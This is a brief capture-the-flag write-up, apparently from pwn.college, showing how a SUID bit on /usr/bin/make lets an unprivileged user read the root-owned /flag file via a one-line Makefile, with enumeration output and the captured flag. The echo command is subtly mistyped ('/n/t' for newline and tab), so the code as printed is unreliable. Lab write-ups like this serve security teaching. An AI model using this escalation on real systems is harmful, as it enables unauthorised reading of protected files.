## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/make`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/make
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/make
```

-The `s` in `-rws` indicates it's a SUID binary.
-`make` runs with **root privileges**.

## 🚀 Exploitation

The `make`  command in Linux is a build automation tool — it's mostly used to compile and build projects, especially those written in C, C++, or other compiled languages.

So we can easily use Makefile to cat /flag:

```bash
echo -e "all:/n/tcat /flag" > Makefile
make
```

Output:
```
cat /flag
pwn.college{sbiUEz2GPn-cyCe8SVy0ruAD8to.dhjNxwSM0IzMyEzW}
